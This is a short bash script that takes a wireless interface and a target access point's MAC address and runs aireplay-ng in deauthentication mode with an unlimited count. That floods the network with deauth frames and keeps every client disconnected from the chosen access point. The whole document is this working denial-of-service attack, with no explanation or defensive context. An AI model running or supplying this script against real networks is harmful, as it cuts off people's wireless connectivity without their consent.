#!/bin/bash

dev=$1   # wlan1 - device
bssid=$2 # 00:11:22:33:44:55 - BSSID (MAC)

sudo aireplay-ng -0 0 -a $bssid $dev
